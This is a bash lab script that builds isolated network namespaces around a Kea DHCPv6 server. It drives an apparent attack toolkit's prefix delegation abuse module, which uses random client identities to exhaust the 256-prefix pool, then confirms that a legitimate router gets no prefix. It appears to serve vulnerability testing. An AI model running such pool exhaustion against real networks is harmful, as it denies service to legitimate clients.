#!/usr/bin/env bash
# Isolated DHCPv6 prefix delegation pool exhaustion lab (Linux only, needs root, Kea installed).
#
# Topology: one bridge (the LAN) with three hosts, each in its own namespace:
#
#   srv:      Kea DHCPv6 server with a prefix delegation pool 2001:db8:f000::/48, delegating /56 blocks
#             (256 prefixes). Kea runs here and is stopped at exit.
#   cli:      a legitimate requesting router. It asks for a prefix before the attack (control) and, with a
#             new identity, after it (test).
#   atk:      MACabre's prefix delegation abuse, with random client identities. It requests ATTACK_REQUESTS
#             prefixes and holds every one it is given.
#
# Phases:
#   Phase 1 (control): cli asks for a prefix. It must get one, or the lab exits 2 (the setup does not work).
#   Phase 2 (attack):  atk requests ATTACK_REQUESTS prefixes and counts the bindings Kea confirms.
#   Phase 3 (test):    cli, with a new DUID-LL, asks for a prefix. With the pool used up it must get none.
#
# Exit 0 when the control holds, the attacker holds at least POOL_SIZE - 1 prefixes (the control client
# holds the other one), and the post-attack request gets no prefix. Exit 1 when the pool was not exhausted or
# the post-attack request still got a prefix. Exit 2 when the control failed, or Kea is not available.
#
# Runs in a VM with IPv6 enabled (the sandbox has no IPv6 sysctls). Nothing here touches the host's real
# network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcpv6_prefix_delegation_abuse_lab.sh
#
# Requirements: iproute2 (ip, bridge), kea-dhcp6 (Kea DHCPv6 server), the project virtualenv (.venv) and a
# kernel with IPv6. Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

if [[ ! -d /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel (/proc/sys/net/ipv6 is missing). Run it in the Ubuntu VM." >&2
    exit 1
fi

if ! command -v kea-dhcp6 >/dev/null 2>&1; then
    echo "This lab needs the Kea DHCPv6 server (kea-dhcp6). Install it with: sudo apt install kea" >&2
    exit 2
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ATTACK_REQUESTS="${ATTACK_REQUESTS:-300}"
ATTACK_SEED="${ATTACK_SEED:-4242}"
POOL_SIZE=256
PD_PREFIX="2001:db8:f000::"
PLEN=56
SERVER_MAC="02:00:00:00:00:10"
CLIENT_MAC="02:00:00:00:00:40"
CLIENT_MAC_AFTER="02:00:00:00:00:41"
ATTACKER_MAC="02:00:00:00:00:50"
WORKDIR="$(mktemp -d)"
KEA_PID=""
CAPTURE_PID=""
CAPTURE_FILE="${CAPTURE_FILE:-$PWD/dhcpv6-pd-cli.pcap}"

stop_lab() {
    if [[ -n "$CAPTURE_PID" ]]; then
        kill -INT "$CAPTURE_PID" 2>/dev/null || true
    fi
    if [[ -n "$KEA_PID" ]]; then
        kill "$KEA_PID" 2>/dev/null || true
    fi
    for ns in lan srv cli atk; do
        ip netns del "$ns" 2>/dev/null || true
    done
    rm -rf "$WORKDIR"
}
trap stop_lab EXIT

stop_lab
WORKDIR="$(mktemp -d)"

ip netns add lan
ip netns add srv
ip netns add cli
ip netns add atk

for pair in "srv:srv" "cli:cli" "atk:atk"; do
    name="${pair%%:*}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$name"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge mcast_snooping 0
ip netns exec lan ip link set br0 up
for name in srv cli atk; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done
ip netns exec srv ip link set h-srv address "$SERVER_MAC"
ip netns exec srv ip link set h-srv up
ip netns exec cli ip link set h-cli address "$CLIENT_MAC"
ip netns exec cli ip link set h-cli up
ip netns exec atk ip link set h-atk address "$ATTACKER_MAC"
ip netns exec atk ip link set h-atk up
# Replies are unicast to the MAC of each client identity, which is not the interface's own MAC.
# Promiscuous mode lets the sniffers see them.
ip netns exec cli ip link set h-cli promisc on
ip netns exec atk ip link set h-atk promisc on

cat > "$WORKDIR/kea-dhcp6.conf" <<EOF
{
  "Dhcp6": {
    "interfaces-config": { "interfaces": [ "h-srv" ] },
    "lease-database": { "type": "memfile", "persist": false },
    "valid-lifetime": 3600,
    "subnet6": [
      {
        "id": 1,
        "subnet": "2001:db8::/64",
        "interface": "h-srv",
        "pools": [ { "pool": "2001:db8::100-2001:db8::1ff" } ],
        "pd-pools": [ { "prefix": "$PD_PREFIX", "prefix-len": 48, "delegated-len": $PLEN } ]
      }
    ]
  }
}
EOF

if ! ip netns exec srv kea-dhcp6 -t "$WORKDIR/kea-dhcp6.conf" >"$WORKDIR/kea-test.log" 2>&1; then
    echo "Control: the Kea configuration is invalid:"
    cat "$WORKDIR/kea-test.log"
    exit 2
fi

# Kea binds to the server's link-local address, which exists only once duplicate address
# detection has finished. Starting Kea before that fails with "Cannot assign requested address".
wait_for_link_local() {
    local i addr
    for i in $(seq 1 40); do
        addr="$(ip netns exec srv ip -6 addr show dev h-srv scope link)"
        if grep -q "fe80::ff:fe00:10/" <<<"$addr" && ! grep -q tentative <<<"$addr"; then
            return 0
        fi
        sleep 0.5
    done
    echo "The server link-local address is not ready:" >&2
    ip netns exec srv ip -6 addr show dev h-srv >&2 || true
    return 1
}
if ! wait_for_link_local; then
    exit 2
fi

ip netns exec srv kea-dhcp6 -c "$WORKDIR/kea-dhcp6.conf" >"$WORKDIR/kea-stdout.log" 2>&1 &
KEA_PID=$!
sleep 3
if ! kill -0 "$KEA_PID" 2>/dev/null; then
    echo "Control: Kea did not start. Its output follows."
    cat "$WORKDIR/kea-stdout.log"
    KEA_PID=""
    exit 2
fi

# One legitimate exchange (SOLICIT, REQUEST) from namespace NS, through MACabre's control helper. Prints the
# prefix it got, or "none".
legit_request() {
    local ns="$1" iface="$2" mac="$3"
    ip netns exec "$ns" env PYTHONPATH="$ROOT/src" "$PY" -c '
import sys
from macabre.attacks.dhcpv6_prefix_delegation_abuse import request_prefix_once
prefix = request_prefix_once(sys.argv[1], sys.argv[2], 56, 3.0)
print(prefix if prefix else "none")
' "$iface" "$mac" 2>"$WORKDIR/legit.err" || echo "none"
}

# Runs the attack from namespace atk and prints the bindings it counted.
attack() {
    ip netns exec atk env PYTHONPATH="$ROOT/src" ATTACK_SEED="$ATTACK_SEED" "$PY" -c '
import os, random, sys, threading
from macabre.attacks.dhcpv6_prefix_delegation_abuse import Dhcpv6PrefixDelegationAbuseConfig, run_dhcpv6_prefix_delegation_abuse
stats = run_dhcpv6_prefix_delegation_abuse(
    Dhcpv6PrefixDelegationAbuseConfig(iface=sys.argv[1], count=int(sys.argv[2]), interval=0.01, plen=56),
    threading.Event(), lambda _s: None,
    rng=random.Random(int(os.environ["ATTACK_SEED"])),
)
print(stats.bindings)
' h-atk "$ATTACK_REQUESTS" 2>"$WORKDIR/attack.err" || echo 0
}

# Kea sends each ADVERTISE to the client's link-local address, and the kernel needs the client's
# MAC for that. A host on a real link has a neighbour entry from its neighbour discovery traffic;
# the lab adds one for the two legitimate clients.
ip netns exec srv ip -6 neigh replace fe80::ff:fe00:40 lladdr "$CLIENT_MAC" dev h-srv nud permanent
ip netns exec srv ip -6 neigh replace fe80::ff:fe00:41 lladdr "$CLIENT_MAC_AFTER" dev h-srv nud permanent

# The attack module draws its client identities from a seeded generator, so the lab replays the
# same sequence and gives the server a neighbour entry for each identity the attack will use.
SEED_CODE='
import os, random
from macabre.attacks.common import random_mac
from macabre.attacks.dhcpv6_prefix_delegation_abuse import link_local_from_mac
rng = random.Random(int(os.environ["ATTACK_SEED"]))
for _ in range(int(os.environ["ATTACK_REQUESTS"])):
    mac = random_mac(rng)
    rng.getrandbits(24)
    rng.getrandbits(32)
    print(link_local_from_mac(mac), mac)
'
seed_identities() {
    local ll mac
    while read -r ll mac; do
        ip netns exec srv ip -6 neigh replace "$ll" lladdr "$mac" dev h-srv nud permanent
    done < <(ATTACK_SEED="$ATTACK_SEED" ATTACK_REQUESTS="$ATTACK_REQUESTS" PYTHONPATH="$ROOT/src" "$PY" -c "$SEED_CODE")
}
seed_identities

# Capture DHCPv6 on the client interface for the whole run, so a failed exchange can be inspected.
if command -v tcpdump >/dev/null 2>&1; then
    nsenter --net=/var/run/netns/cli tcpdump -i h-cli -U -n -w "$CAPTURE_FILE" 'udp port 546 or udp port 547' \
        2>"$WORKDIR/tcpdump.err" &
    CAPTURE_PID=$!
    sleep 1
fi

echo "Phase 1: control, the legitimate client asks for a /$PLEN prefix"
CONTROL="$(legit_request cli h-cli "$CLIENT_MAC")"
echo "  prefix received: $CONTROL"
echo

echo "Phase 2: attacker asks for $ATTACK_REQUESTS prefixes with random identities"
BINDINGS="$(attack)"
echo "  prefixes held by the attacker (confirmed by the server): $BINDINGS"
echo "  pool size: $POOL_SIZE prefixes"
echo

echo "Phase 3: legitimate client with a new identity asks for a prefix after the attack"
AFTER="$(legit_request cli h-cli "$CLIENT_MAC_AFTER")"
echo "  prefix received: $AFTER"
echo

if [[ -n "$CAPTURE_PID" ]]; then
    kill -INT "$CAPTURE_PID" 2>/dev/null || true
    wait "$CAPTURE_PID" 2>/dev/null || true
    CAPTURE_PID=""
fi
if [[ "$CONTROL" == "none" || "$AFTER" == "none" ]] && [[ -s "$CAPTURE_FILE" ]]; then
    echo "DHCPv6 packets seen on the client interface (also saved to $CAPTURE_FILE):"
    tcpdump -nr "$CAPTURE_FILE" -vv 2>/dev/null | tail -n 60 || true
fi
if [[ "$CONTROL" == "none" ]]; then
    echo "Error from the legitimate client helper:"
    tail -n 20 "$WORKDIR/legit.err" || true
    echo "Last lines of the Kea log:"
    tail -n 20 "$WORKDIR/kea-stdout.log" || true
    echo "Control: the legitimate client got no prefix before the attack. Result unreliable."
    exit 2
fi
if (( BINDINGS >= POOL_SIZE - 1 )) && [[ "$AFTER" == "none" ]]; then
    echo "Result: the attacker's requests used up the delegation pool ($BINDINGS prefixes held of $POOL_SIZE). The legitimate client got no prefix afterwards. Vulnerable: prefix delegation can be exhausted from one port."
    exit 0
fi
if [[ "$AFTER" != "none" ]]; then
    echo "Result: the legitimate client still got a prefix after the attack ($AFTER). The pool was not exhausted. Not validated."
    exit 1
fi
echo "Result: the attacker held $BINDINGS prefixes, below the pool size of $POOL_SIZE. Not validated."
exit 1
